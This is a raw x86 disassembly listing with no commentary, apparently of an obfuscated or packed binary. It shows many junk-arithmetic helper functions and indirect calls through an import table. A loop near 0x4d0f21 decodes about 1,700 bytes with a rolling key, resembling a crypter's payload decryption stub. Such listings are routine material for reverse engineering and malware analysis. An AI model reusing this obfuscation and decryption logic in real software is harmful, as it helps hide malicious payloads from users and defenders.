  4d0764:	lea    esi,ds:0x4d3138
  4d076a:	sub    ebx,DWORD PTR [esi-0xe0]
  4d0770:	mov    edx,0x0
  4d0775:	push   edx
  4d0776:	call   0x4d0c50
  4d077b:	add    esp,0x4
  4d077e:	push   esi
  4d077f:	push   DWORD PTR [esi+0x8]
  4d0782:	push   edi
  4d0783:	push   ecx
  4d0784:	call   0x4d11ac
  4d0789:	add    esp,0xc
  4d078c:	pop    esi
  4d078d:	mov    eax,0x4d2028
  4d0792:	mov    eax,DWORD PTR [eax]
  4d0794:	push   eax
  4d0795:	push   DWORD PTR [esi+0x24]
  4d0798:	pop    eax
  4d0799:	call   eax
  4d079b:	add    esp,0x28
  4d079e:	pop    ebp
  4d079f:	ret    
  4d07a0:	mov    edi,edi
  4d07a2:	push   ebp
  4d07a3:	mov    ebp,esp
  4d07a5:	sub    esp,0x38
  4d07a8:	lea    edx,ds:0x4d31b4
  4d07ae:	cmp    edx,0x617c
  4d07b4:	jbe    0x4d07a3
  4d07b6:	push   edx
  4d07b7:	mov    edi,0x0
  4d07bc:	push   edi
  4d07bd:	call   0x4d0ad4
  4d07c2:	add    esp,0x4
  4d07c5:	pop    edx
  4d07c6:	push   edx
  4d07c7:	push   eax
  4d07c8:	push   DWORD PTR [edx+0xd4]
  4d07ce:	call   0x4d15c0
  4d07d3:	add    esp,0x8
  4d07d6:	pop    edx
  4d07d7:	push   edx
  4d07d8:	call   0x4d0990
  4d07dd:	add    esp,0x4
  4d07e0:	pop    edx
  4d07e1:	add    esp,0x38
  4d07e4:	pop    ebp
  4d07e5:	ret    
  4d07e6:	add    BYTE PTR [eax],al
  4d07e8:	mov    edi,edi
  4d07ea:	push   ebp
  4d07eb:	mov    ebp,esp
  4d07ed:	sub    esp,0x5c
  4d07f0:	lea    eax,ds:0x4d31d8
  4d07f6:	sub    DWORD PTR [ebp-0x40],0x1f
  4d07fa:	push   eax
  4d07fb:	push   edi
  4d07fc:	push   DWORD PTR [eax+0x184]
  4d0802:	push   DWORD PTR [eax+0x98]
  4d0808:	push   DWORD PTR [eax+0x1d4]
  4d080e:	call   0x4d0a98
  4d0813:	add    esp,0x10
  4d0816:	pop    eax
  4d0817:	push   eax
  4d0818:	call   0x4d0704
  4d081d:	add    esp,0x4
  4d0820:	pop    eax
  4d0821:	push   eax
  4d0822:	mov    ebx,0x0
  4d0827:	push   ebx
  4d0828:	call   0x4d0b88
  4d082d:	add    esp,0x4
  4d0830:	pop    eax
  4d0831:	add    esp,0x5c
  4d0834:	pop    ebp
  4d0835:	ret    
  4d0836:	add    BYTE PTR [eax],al
  4d0838:	pop    edi
  4d0839:	call   DWORD PTR ds:0x4d2094
  4d083f:	call   edi
  4d0841:	add    BYTE PTR [eax],al
  4d0843:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0849:	sub    esp,0x58
  4d084c:	lea    edi,ds:0x4d3100
  4d0852:	sub    DWORD PTR [ebp-0x4c],0xffffb5d8
  4d0859:	push   edi
  4d085a:	push   DWORD PTR [edi+0xac]
  4d0860:	push   DWORD PTR [edi+0x1e0]
  4d0866:	push   ebx
  4d0867:	push   edx
  4d0868:	call   0x4d0b40
  4d086d:	add    esp,0x10
  4d0870:	pop    edi
  4d0871:	push   edi
  4d0872:	mov    ecx,0x0
  4d0877:	push   ecx
  4d0878:	call   0x4d0c50
  4d087d:	add    esp,0x4
  4d0880:	pop    edi
  4d0881:	push   edi
  4d0882:	push   0x0
  4d0884:	call   0x4d0d94
  4d0889:	add    esp,0x4
  4d088c:	pop    edi
  4d088d:	add    esp,0x58
  4d0890:	pop    ebp
  4d0891:	ret    
  4d0892:	add    BYTE PTR [eax],al
  4d0894:	pop    edi
  4d0895:	call   DWORD PTR ds:0x4d2044
  4d089b:	call   edi
  4d089d:	add    BYTE PTR [eax],al
  4d089f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08a5:	sub    esp,0x2c
  4d08a8:	lea    ecx,[esi-0xb8]
  4d08ae:	mov    DWORD PTR [ecx+0xc0],0xffff87fa
  4d08b8:	push   ecx
  4d08b9:	push   DWORD PTR [ecx+0x120]
  4d08bf:	push   ebx
  4d08c0:	push   ebx
  4d08c1:	push   DWORD PTR [ecx+0x50]
  4d08c4:	call   0x4d0e08
  4d08c9:	add    esp,0x10
  4d08cc:	pop    ecx
  4d08cd:	push   ecx
  4d08ce:	call   0x4d0704
  4d08d3:	add    esp,0x4
  4d08d6:	pop    ecx
  4d08d7:	push   ecx
  4d08d8:	mov    edx,0x0
  4d08dd:	push   edx
  4d08de:	call   0x4d0b94
  4d08e3:	add    esp,0x4
  4d08e6:	pop    ecx
  4d08e7:	add    esp,0x2c
  4d08ea:	pop    ebp
  4d08eb:	ret    
  4d08ec:	pop    edi
  4d08ed:	call   DWORD PTR ds:0x4d2084
  4d08f3:	call   edi
  4d08f5:	add    BYTE PTR [eax],al
  4d08f7:	add    BYTE PTR [edi-0x1],bl
  4d08fa:	adc    eax,0x4d2040
  4d08ff:	call   edi
  4d0901:	add    BYTE PTR [eax],al
  4d0903:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0909:	sub    esp,0x40
  4d090c:	mov    edx,0x4d31f0
  4d0911:	sub    DWORD PTR [edx-0x110],0x22
  4d0918:	push   edx
  4d0919:	mov    edx,0x0
  4d091e:	push   edx
  4d091f:	call   0x4d08f8
  4d0924:	add    esp,0x4
  4d0927:	pop    edx
  4d0928:	push   edx
  4d0929:	push   DWORD PTR [edx+0x128]
  4d092f:	push   DWORD PTR [edx+0x100]
  4d0935:	call   0x4d0cfc
  4d093a:	add    esp,0x8
  4d093d:	pop    edx
  4d093e:	push   edx
  4d093f:	mov    edx,0x0
  4d0944:	push   edx
  4d0945:	call   0x4d0d94
  4d094a:	add    esp,0x4
  4d094d:	pop    edx
  4d094e:	add    esp,0x40
  4d0951:	pop    ebp
  4d0952:	ret    
  4d0953:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0959:	sub    esp,0x58
  4d095c:	lea    edi,[ebx+0x14]
  4d095f:	or     esi,ecx
  4d0961:	push   edi
  4d0962:	push   ebx
  4d0963:	push   edx
  4d0964:	call   0x4d0ec4
  4d0969:	add    esp,0x8
  4d096c:	pop    edi
  4d096d:	push   edi
  4d096e:	push   0x0
  4d0970:	call   0x4d0d94
  4d0975:	add    esp,0x4
  4d0978:	pop    edi
  4d0979:	push   edi
  4d097a:	mov    edi,0x0
  4d097f:	push   edi
  4d0980:	call   0x4d0ff0
  4d0985:	add    esp,0x4
  4d0988:	pop    edi
  4d0989:	add    esp,0x58
  4d098c:	pop    ebp
  4d098d:	ret    
  4d098e:	add    BYTE PTR [eax],al
  4d0990:	pop    edi
  4d0991:	call   DWORD PTR ds:0x4d2030
  4d0997:	call   edi
  4d0999:	add    BYTE PTR [eax],al
  4d099b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09a1:	sub    esp,0x3c
  4d09a4:	lea    ecx,[eax+0x8]
  4d09a7:	cmp    ecx,0x405e
  4d09ad:	jbe    0x4d099f
  4d09af:	push   ecx
  4d09b0:	mov    ecx,0x0
  4d09b5:	push   ecx
  4d09b6:	call   0x4d109c
  4d09bb:	add    esp,0x4
  4d09be:	pop    ecx
  4d09bf:	push   ecx
  4d09c0:	push   DWORD PTR [ecx+0xec]
  4d09c6:	push   DWORD PTR [ecx]
  4d09c8:	call   0x4d0dac
  4d09cd:	add    esp,0x8
  4d09d0:	pop    ecx
  4d09d1:	push   ecx
  4d09d2:	push   0x0
  4d09d4:	call   0x4d08f8
  4d09d9:	add    esp,0x4
  4d09dc:	pop    ecx
  4d09dd:	add    esp,0x3c
  4d09e0:	pop    ebp
  4d09e1:	ret    
  4d09e2:	add    BYTE PTR [eax],al
  4d09e4:	mov    edi,edi
  4d09e6:	push   ebp
  4d09e7:	mov    ebp,esp
  4d09e9:	sub    esp,0x20
  4d09ec:	lea    edi,[eax+0x2c]
  4d09ef:	cmp    edi,0x6bf8
  4d09f5:	je     0x4d09e7
  4d09f7:	push   edi
  4d09f8:	lea    esi,[edi-0xcc]
  4d09fe:	push   esi
  4d09ff:	call   0x4d0b7c
  4d0a04:	add    esp,0x4
  4d0a07:	test   eax,eax
  4d0a09:	jne    0x4d09f8
  4d0a0b:	pop    edi
  4d0a0c:	push   edi
  4d0a0d:	push   ecx
  4d0a0e:	push   DWORD PTR [edi+0x114]
  4d0a14:	push   ecx
  4d0a15:	push   DWORD PTR [edi+0x44]
  4d0a18:	call   0x4d0cac
  4d0a1d:	add    esp,0x10
  4d0a20:	pop    edi
  4d0a21:	push   edi
  4d0a22:	mov    ebx,0x0
  4d0a27:	push   ebx
  4d0a28:	call   0x4d0b94
  4d0a2d:	add    esp,0x4
  4d0a30:	pop    edi
  4d0a31:	add    esp,0x20
  4d0a34:	pop    ebp
  4d0a35:	ret    
  4d0a36:	add    BYTE PTR [eax],al
  4d0a38:	pop    edi
  4d0a39:	call   DWORD PTR ds:0x4d2068
  4d0a3f:	call   edi
  4d0a41:	add    BYTE PTR [eax],al
  4d0a43:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a49:	sub    esp,0x48
  4d0a4c:	mov    ecx,0x4d30f8
  4d0a51:	sbb    DWORD PTR [ecx+0x38],eax
  4d0a54:	push   ecx
  4d0a55:	push   DWORD PTR [ecx+0x128]
  4d0a5b:	push   eax
  4d0a5c:	push   DWORD PTR [ecx+0x6c]
  4d0a5f:	push   DWORD PTR [ecx+0x1f0]
  4d0a65:	call   0x4d13f0
  4d0a6a:	add    esp,0x10
  4d0a6d:	pop    ecx
  4d0a6e:	push   ecx
  4d0a6f:	call   0x4d0704
  4d0a74:	add    esp,0x4
  4d0a77:	pop    ecx
  4d0a78:	push   ecx
  4d0a79:	push   0x0
  4d0a7b:	call   0x4d0dfc
  4d0a80:	add    esp,0x4
  4d0a83:	pop    ecx
  4d0a84:	add    esp,0x48
  4d0a87:	pop    ebp
  4d0a88:	ret    
  4d0a89:	add    BYTE PTR [eax],al
  4d0a8b:	add    BYTE PTR [edi-0x1],bl
  4d0a8e:	adc    eax,0x4d2034
  4d0a93:	call   edi
  4d0a95:	add    BYTE PTR [eax],al
  4d0a97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a9d:	sub    esp,0x24
  4d0aa0:	lea    ebx,[eax-0x9c]
  4d0aa6:	adc    ecx,0xffffff96
  4d0aa9:	call   0x4d0be8
  4d0aae:	add    esp,0x4
  4d0ab1:	push   ebx
  4d0ab2:	push   DWORD PTR [ebx+0xfc]
  4d0ab8:	push   esi
  4d0ab9:	call   0x4d07a0
  4d0abe:	add    esp,0x8
  4d0ac1:	pop    ebx
  4d0ac2:	push   0x0
  4d0ac4:	call   0x4d0c50
  4d0ac9:	add    esp,0x4
  4d0acc:	add    esp,0x24
  4d0acf:	pop    ebp
  4d0ad0:	ret    
  4d0ad1:	add    BYTE PTR [eax],al
  4d0ad3:	add    BYTE PTR [edi-0x1],bl
  4d0ad6:	adc    eax,0x4d206c
  4d0adb:	call   edi
  4d0add:	add    BYTE PTR [eax],al
  4d0adf:	add    BYTE PTR [edi-0x1],bl
  4d0ae2:	adc    eax,0x4d2088
  4d0ae7:	call   edi
  4d0ae9:	add    BYTE PTR [eax],al
  4d0aeb:	add    BYTE PTR [edi-0x1],bl
  4d0aee:	adc    eax,0x4d2060
  4d0af3:	call   edi
  4d0af5:	add    BYTE PTR [eax],al
  4d0af7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0afd:	sub    esp,0x2c
  4d0b00:	lea    edx,[ecx-0x1c8]
  4d0b06:	cmp    edx,0xb3f
  4d0b0c:	jbe    0x4d0afb
  4d0b0e:	push   edx
  4d0b0f:	push   0x0
  4d0b11:	call   0x4d0ff0
  4d0b16:	add    esp,0x4
  4d0b19:	pop    edx
  4d0b1a:	push   edx
  4d0b1b:	push   edi
  4d0b1c:	push   eax
  4d0b1d:	push   DWORD PTR [edx+0x124]
  4d0b23:	push   DWORD PTR [edx]
  4d0b25:	call   0x4d14a0
  4d0b2a:	add    esp,0x10
  4d0b2d:	pop    edx
  4d0b2e:	push   edx
  4d0b2f:	call   0x4d0be8
  4d0b34:	add    esp,0x4
  4d0b37:	pop    edx
  4d0b38:	add    esp,0x2c
  4d0b3b:	pop    ebp
  4d0b3c:	ret    
  4d0b3d:	add    BYTE PTR [eax],al
  4d0b3f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b45:	sub    esp,0x28
  4d0b48:	mov    eax,0x4d30a0
  4d0b4d:	xor    edx,DWORD PTR [eax-0x20]
  4d0b50:	push   eax
  4d0b51:	push   edx
  4d0b52:	push   DWORD PTR [eax+0x20]
  4d0b55:	push   esi
  4d0b56:	call   0x4d09e4
  4d0b5b:	add    esp,0xc
  4d0b5e:	pop    eax
  4d0b5f:	push   eax
  4d0b60:	push   0x0
  4d0b62:	call   0x4d109c
  4d0b67:	add    esp,0x4
  4d0b6a:	pop    eax
  4d0b6b:	push   eax
  4d0b6c:	call   0x4d0be8
  4d0b71:	add    esp,0x4
  4d0b74:	pop    eax
  4d0b75:	add    esp,0x28
  4d0b78:	pop    ebp
  4d0b79:	ret    
  4d0b7a:	add    BYTE PTR [eax],al
  4d0b7c:	pop    edi
  4d0b7d:	call   DWORD PTR ds:0x4d2028
  4d0b83:	call   edi
  4d0b85:	add    BYTE PTR [eax],al
  4d0b87:	add    BYTE PTR [edi-0x1],bl
  4d0b8a:	adc    eax,0x4d2048
  4d0b8f:	call   edi
  4d0b91:	add    BYTE PTR [eax],al
  4d0b93:	add    BYTE PTR [edi-0x1],bl
  4d0b96:	adc    eax,0x4d2018
  4d0b9b:	call   edi
  4d0b9d:	add    BYTE PTR [eax],al
  4d0b9f:	add    BYTE PTR [edi+0x2b],dl
  4d0ba2:	call   DWORD PTR [edi+0x57]
  4d0ba5:	push   edi
  4d0ba6:	push   edi
  4d0ba7:	call   0x4d0be8
  4d0bac:	sub    esp,0xfffffffc
  4d0baf:	call   0x4d1398
  4d0bb4:	push   0x2
  4d0bb6:	xor    eax,eax
  4d0bb8:	sub    eax,0x4d3030
  4d0bbd:	neg    eax
  4d0bbf:	push   0x0
  4d0bc1:	lea    ecx,[eax+0x4]
  4d0bc4:	add    BYTE PTR [ecx],0x3
  4d0bc7:	push   eax
  4d0bc8:	call   0x4d0894
  4d0bcd:	pop    edi
  4d0bce:	pop    edi
  4d0bcf:	pop    edi
  4d0bd0:	lea    ecx,[eax+0x3b]
  4d0bd3:	mov    edi,DWORD PTR [ecx]
  4d0bd5:	lea    eax,[eax+edi*1]
  4d0bd8:	mov    eax,DWORD PTR [eax+0x28]
  4d0bdb:	pusha  
  4d0bdc:	mov    ah,0x45
  4d0bde:	sub    al,ah
  4d0be0:	ja     0x4d075c
  4d0be6:	popa   
  4d0be7:	ret    
  4d0be8:	pop    edi
  4d0be9:	call   DWORD PTR ds:0x4d202c
  4d0bef:	call   edi
  4d0bf1:	add    BYTE PTR [eax],al
  4d0bf3:	add    BYTE PTR [edi-0x1],bl
  4d0bf6:	adc    eax,0x4d2008
  4d0bfb:	call   edi
  4d0bfd:	add    BYTE PTR [eax],al
  4d0bff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c05:	sub    esp,0x44
  4d0c08:	lea    eax,ds:0x4d3184
  4d0c0e:	add    DWORD PTR [eax-0x100],0xffffffb9
  4d0c15:	push   eax
  4d0c16:	push   0x0
  4d0c18:	call   0x4d1048
  4d0c1d:	add    esp,0x4
  4d0c20:	pop    eax
  4d0c21:	push   eax
  4d0c22:	push   DWORD PTR [eax+0x1b4]
  4d0c28:	push   edi
  4d0c29:	push   DWORD PTR [eax+0x198]
  4d0c2f:	push   edx
  4d0c30:	call   0x4d099c
  4d0c35:	add    esp,0x10
  4d0c38:	pop    eax
  4d0c39:	push   eax
  4d0c3a:	mov    ebx,0x0
  4d0c3f:	push   ebx
  4d0c40:	call   0x4d0b88
  4d0c45:	add    esp,0x4
  4d0c48:	pop    eax
  4d0c49:	add    esp,0x44
  4d0c4c:	pop    ebp
  4d0c4d:	ret    
  4d0c4e:	add    BYTE PTR [eax],al
  4d0c50:	pop    edi
  4d0c51:	call   DWORD PTR ds:0x4d2054
  4d0c57:	call   edi
  4d0c59:	add    BYTE PTR [eax],al
  4d0c5b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c61:	sub    esp,0x38
  4d0c64:	mov    ecx,0x4d30d4
  4d0c69:	or     DWORD PTR [ecx+0x128],0x6129
  4d0c73:	push   ecx
  4d0c74:	lea    eax,[ecx-0xd4]
  4d0c7a:	push   eax
  4d0c7b:	call   0x4d0b7c
  4d0c80:	add    esp,0x4
  4d0c83:	test   eax,eax
  4d0c85:	jne    0x4d0c74
  4d0c87:	pop    ecx
  4d0c88:	push   ecx
  4d0c89:	push   edx
  4d0c8a:	push   edx
  4d0c8b:	call   0x4d1354
  4d0c90:	add    esp,0x8
  4d0c93:	pop    ecx
  4d0c94:	push   ecx
  4d0c95:	mov    edi,0x0
  4d0c9a:	push   edi
  4d0c9b:	call   0x4d0ad4
  4d0ca0:	add    esp,0x4
  4d0ca3:	pop    ecx
  4d0ca4:	add    esp,0x38
  4d0ca7:	pop    ebp
  4d0ca8:	ret    
  4d0ca9:	add    BYTE PTR [eax],al
  4d0cab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cb1:	sub    esp,0x54
  4d0cb4:	lea    eax,[edi-0x40]
  4d0cb7:	adc    ecx,DWORD PTR [eax-0x10]
  4d0cba:	push   eax
  4d0cbb:	call   0x4d0be8
  4d0cc0:	add    esp,0x4
  4d0cc3:	pop    eax
  4d0cc4:	push   eax
  4d0cc5:	push   DWORD PTR [eax+0x8c]
  4d0ccb:	push   DWORD PTR [eax+0x158]
  4d0cd1:	call   0x4d12c4
  4d0cd6:	add    esp,0x8
  4d0cd9:	pop    eax
  4d0cda:	push   eax
  4d0cdb:	mov    esi,0x0
  4d0ce0:	push   esi
  4d0ce1:	call   0x4d0dfc
  4d0ce6:	add    esp,0x4
  4d0ce9:	pop    eax
  4d0cea:	add    esp,0x54
  4d0ced:	pop    ebp
  4d0cee:	ret    
  4d0cef:	add    BYTE PTR [edi-0x1],bl
  4d0cf2:	adc    eax,0x4d2078
  4d0cf7:	call   edi
  4d0cf9:	add    BYTE PTR [eax],al
  4d0cfb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d01:	sub    esp,0x3c
  4d0d04:	lea    esi,ds:0x4d3118
  4d0d0a:	sub    eax,DWORD PTR [esi-0xac]
  4d0d10:	push   esi
  4d0d11:	push   DWORD PTR [esi+0x13c]
  4d0d17:	push   DWORD PTR [esi+0x1fc]
  4d0d1d:	push   DWORD PTR [esi+0x1d8]
  4d0d23:	push   ecx
  4d0d24:	call   0x4d0f5c
  4d0d29:	add    esp,0x10
  4d0d2c:	pop    esi
  4d0d2d:	push   0xfffffff4
  4d0d2f:	call   0x4d103c
  4d0d34:	add    esp,0x4
  4d0d37:	push   0x0
  4d0d39:	call   0x4d109c
  4d0d3e:	add    esp,0x4
  4d0d41:	add    esp,0x3c
  4d0d44:	pop    ebp
  4d0d45:	ret    
  4d0d46:	add    BYTE PTR [eax],al
  4d0d48:	pop    edi
  4d0d49:	call   DWORD PTR ds:0x4d208c
  4d0d4f:	call   edi
  4d0d51:	add    BYTE PTR [eax],al
  4d0d53:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d59:	sub    esp,0x40
  4d0d5c:	lea    ebx,[edx-0x10]
  4d0d5f:	adc    edx,0x5d46
  4d0d65:	push   ebx
  4d0d66:	push   edi
  4d0d67:	push   DWORD PTR [ebx+0x1b8]
  4d0d6d:	call   0x4d1430
  4d0d72:	add    esp,0x8
  4d0d75:	pop    ebx
  4d0d76:	mov    eax,0x0
  4d0d7b:	push   eax
  4d0d7c:	call   0x4d0c50
  4d0d81:	add    esp,0x4
  4d0d84:	push   0xfffffff4
  4d0d86:	call   0x4d103c
  4d0d8b:	add    esp,0x4
  4d0d8e:	add    esp,0x40
  4d0d91:	pop    ebp
  4d0d92:	ret    
  4d0d93:	add    BYTE PTR [edi-0x1],bl
  4d0d96:	adc    eax,0x4d2010
  4d0d9b:	call   edi
  4d0d9d:	add    BYTE PTR [eax],al
  4d0d9f:	add    BYTE PTR [edi-0x1],bl
  4d0da2:	adc    eax,0x4d2058
  4d0da7:	call   edi
  4d0da9:	add    BYTE PTR [eax],al
  4d0dab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0db1:	sub    esp,0x24
  4d0db4:	lea    edi,[ecx-0x128]
  4d0dba:	and    ebx,DWORD PTR [ebp-0x8]
  4d0dbd:	push   edi
  4d0dbe:	mov    esi,0x0
  4d0dc3:	push   esi
  4d0dc4:	call   0x4d0c50
  4d0dc9:	add    esp,0x4
  4d0dcc:	pop    edi
  4d0dcd:	push   edi
  4d0dce:	push   eax
  4d0dcf:	push   DWORD PTR [edi+0x1d8]
  4d0dd5:	push   edx
  4d0dd6:	push   DWORD PTR [edi+0x168]
  4d0ddc:	call   0x4d0a44
  4d0de1:	add    esp,0x10
  4d0de4:	pop    edi
  4d0de5:	push   edi
  4d0de6:	mov    eax,0x0
  4d0deb:	push   eax
  4d0dec:	call   0x4d0ad4
  4d0df1:	add    esp,0x4
  4d0df4:	pop    edi
  4d0df5:	add    esp,0x24
  4d0df8:	pop    ebp
  4d0df9:	ret    
  4d0dfa:	add    BYTE PTR [eax],al
  4d0dfc:	pop    edi
  4d0dfd:	call   DWORD PTR ds:0x4d207c
  4d0e03:	call   edi
  4d0e05:	add    BYTE PTR [eax],al
  4d0e07:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e0d:	sub    esp,0x2c
  4d0e10:	mov    edi,0x4d31b0
  4d0e15:	sbb    DWORD PTR [ebp-0x18],0xfffffc05
  4d0e1c:	push   edi
  4d0e1d:	push   ecx
  4d0e1e:	push   DWORD PTR [edi+0xd0]
  4d0e24:	push   DWORD PTR [edi+0xbc]
  4d0e2a:	push   ebx
  4d0e2b:	call   0x4d0710
  4d0e30:	add    esp,0x10
  4d0e33:	pop    edi
  4d0e34:	push   edi
  4d0e35:	push   0x0
  4d0e37:	call   0x4d0b94
  4d0e3c:	add    esp,0x4
  4d0e3f:	pop    edi
  4d0e40:	push   edi
  4d0e41:	push   0xfffffff4
  4d0e43:	call   0x4d103c
  4d0e48:	add    esp,0x4
  4d0e4b:	pop    edi
  4d0e4c:	add    esp,0x2c
  4d0e4f:	pop    ebp
  4d0e50:	ret    
  4d0e51:	add    BYTE PTR [eax],al
  4d0e53:	add    BYTE PTR [edi-0x1],bl
  4d0e56:	adc    eax,0x4d2014
  4d0e5b:	call   edi
  4d0e5d:	add    BYTE PTR [eax],al
  4d0e5f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e65:	sub    esp,0x44
  4d0e68:	lea    edx,ds:0x4d318c
  4d0e6e:	sub    DWORD PTR [edx-0x98],0x1e
  4d0e75:	push   edx
  4d0e76:	mov    esi,0x0
  4d0e7b:	push   esi
  4d0e7c:	call   0x4d0dfc
  4d0e81:	add    esp,0x4
  4d0e84:	pop    edx
  4d0e85:	push   edx
  4d0e86:	push   ecx
  4d0e87:	push   edi
  4d0e88:	push   DWORD PTR [edx+0x124]
  4d0e8e:	call   0x4d10f4
  4d0e93:	add    esp,0xc
  4d0e96:	pop    edx
  4d0e97:	push   edx
  4d0e98:	mov    eax,0x0
  4d0e9d:	push   eax
  4d0e9e:	call   0x4d0b88
  4d0ea3:	add    esp,0x4
  4d0ea6:	pop    edx
  4d0ea7:	add    esp,0x44
  4d0eaa:	pop    ebp
  4d0eab:	ret    
  4d0eac:	pop    edi
  4d0ead:	call   DWORD PTR ds:0x4d2098
  4d0eb3:	call   edi
  4d0eb5:	add    BYTE PTR [eax],al
  4d0eb7:	add    BYTE PTR [edi-0x1],bl
  4d0eba:	adc    eax,0x4d201c
  4d0ebf:	call   edi
  4d0ec1:	add    BYTE PTR [eax],al
  4d0ec3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ec9:	sub    esp,0x44
  4d0ecc:	add    DWORD PTR [edi+0xe4],0x315c
  4d0ed6:	lea    edx,ds:0x4d30ec
  4d0edc:	push   edx
  4d0edd:	push   0x6ac
  4d0ee2:	mov    eax,0x6ac
  4d0ee7:	push   eax
  4d0ee8:	push   0x40001
  4d0eed:	mov    ecx,0x8629859e
  4d0ef2:	push   DWORD PTR [ecx+0x7a239a86]
  4d0ef8:	sub    DWORD PTR [esp],0x2
  4d0efc:	mov    ecx,0x4d2044
  4d0f01:	pop    DWORD PTR [ecx]
  4d0f03:	call   0x4d0894
  4d0f08:	add    esp,0x4
  4d0f0b:	xchg   DWORD PTR [esp],eax
  4d0f0e:	mov    edx,eax
  4d0f10:	pop    DWORD PTR [edx+0x70]
  4d0f13:	mov    esi,DWORD PTR [edx+0x70]
  4d0f16:	lea    eax,[esi]
  4d0f18:	sub    esi,esi
  4d0f1a:	dec    esi
  4d0f1b:	and    esi,0x4d0014
  4d0f21:	mov    ebx,0x8d9ae218
  4d0f26:	xor    ecx,ecx
  4d0f28:	cmp    ecx,0x6ac
  4d0f2e:	je     0x4d0f4c
  4d0f30:	sub    ecx,0xfffffffc
  4d0f33:	xor    edi,edi
  4d0f35:	push   DWORD PTR [esi+edi*1]
  4d0f38:	add    DWORD PTR [esp],ebx
  4d0f3b:	pop    DWORD PTR [eax+edi*2]
  4d0f3e:	dec    DWORD PTR [eax]
  4d0f40:	xor    ebx,ebx
  4d0f42:	add    ebx,DWORD PTR [esi]
  4d0f44:	add    esi,0x4
  4d0f47:	add    eax,0x4
  4d0f4a:	jmp    0x4d0f28
  4d0f4c:	push   edx
  4d0f4d:	call   0x4d0be8
  4d0f52:	add    esp,0x4
  4d0f55:	pop    edx
  4d0f56:	add    esp,0x44
  4d0f59:	pop    ebp
  4d0f5a:	ret    
  4d0f5b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f61:	sub    esp,0x5c
  4d0f64:	lea    edx,[esi-0x98]
  4d0f6a:	and    DWORD PTR [edx+0x170],ecx
  4d0f70:	push   edx
  4d0f71:	push   0x0
  4d0f73:	call   0x4d0b94
  4d0f78:	add    esp,0x4
  4d0f7b:	pop    edx
  4d0f7c:	push   edx
  4d0f7d:	push   DWORD PTR [edx+0xf0]
  4d0f83:	push   edi
  4d0f84:	push   ecx
  4d0f85:	push   edi
  4d0f86:	call   0x4d0d54
  4d0f8b:	add    esp,0x10
  4d0f8e:	pop    edx
  4d0f8f:	push   edx
  4d0f90:	mov    esi,0x0
  4d0f95:	push   esi
  4d0f96:	call   0x4d0d94
  4d0f9b:	add    esp,0x4
  4d0f9e:	pop    edx
  4d0f9f:	add    esp,0x5c
  4d0fa2:	pop    ebp
  4d0fa3:	ret    
  4d0fa4:	pop    edi
  4d0fa5:	call   DWORD PTR ds:0x4d20a0
  4d0fab:	call   edi
  4d0fad:	add    BYTE PTR [eax],al
  4d0faf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fb5:	sub    esp,0x3c
  4d0fb8:	mov    eax,0x4d3028
  4d0fbd:	adc    DWORD PTR [eax+0x1c4],edx
  4d0fc3:	push   eax
  4d0fc4:	push   0x0
  4d0fc6:	call   0x4d109c
  4d0fcb:	add    esp,0x4
  4d0fce:	pop    eax
  4d0fcf:	push   eax
  4d0fd0:	push   DWORD PTR [eax+0x17c]
  4d0fd6:	push   ecx
  4d0fd7:	push   edi
  4d0fd8:	call   0x4d0844
  4d0fdd:	add    esp,0xc
  4d0fe0:	pop    eax
  4d0fe1:	push   eax
  4d0fe2:	call   0x4d0990
  4d0fe7:	add    esp,0x4
  4d0fea:	pop    eax
  4d0feb:	add    esp,0x3c
  4d0fee:	pop    ebp
  4d0fef:	ret    
  4d0ff0:	pop    edi
  4d0ff1:	call   DWORD PTR ds:0x4d204c
  4d0ff7:	call   edi
  4d0ff9:	add    BYTE PTR [eax],al
  4d0ffb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1001:	sub    esp,0x24
  4d1004:	mov    ebx,0x4d30f4
  4d1009:	add    esi,DWORD PTR [ebx+0xe4]
  4d100f:	push   ebx
  4d1010:	push   ecx
  4d1011:	push   ecx
  4d1012:	push   DWORD PTR [ebx+0x7c]
  4d1015:	call   0x4d1308
  4d101a:	add    esp,0xc
  4d101d:	pop    ebx
  4d101e:	mov    edx,0x0
  4d1023:	push   edx
  4d1024:	call   0x4d0dfc
  4d1029:	add    esp,0x4
  4d102c:	push   0x0
  4d102e:	call   0x4d0ad4
  4d1033:	add    esp,0x4
  4d1036:	add    esp,0x24
  4d1039:	pop    ebp
  4d103a:	ret    
  4d103b:	add    BYTE PTR [edi-0x1],bl
  4d103e:	adc    eax,0x4d200c
  4d1043:	call   edi
  4d1045:	add    BYTE PTR [eax],al
  4d1047:	add    BYTE PTR [edi-0x1],bl
  4d104a:	adc    eax,0x4d2004
  4d104f:	call   edi
  4d1051:	add    BYTE PTR [eax],al
  4d1053:	add    BYTE PTR [edi-0x1],bl
  4d1056:	adc    eax,0x4d209c
  4d105b:	call   edi
  4d105d:	add    BYTE PTR [eax],al
  4d105f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1065:	sub    esp,0x5c
  4d1068:	lea    esi,[edi+0x4c]
  4d106b:	add    ebx,DWORD PTR [ebp-0x8]
  4d106e:	push   esi
  4d106f:	push   edx
  4d1070:	push   eax
  4d1071:	call   0x4d0c5c
  4d1076:	add    esp,0x8
  4d1079:	pop    esi
  4d107a:	mov    edx,0x0
  4d107f:	push   edx
  4d1080:	call   0x4d1048
  4d1085:	add    esp,0x4
  4d1088:	mov    edi,0xfffffff4
  4d108d:	push   edi
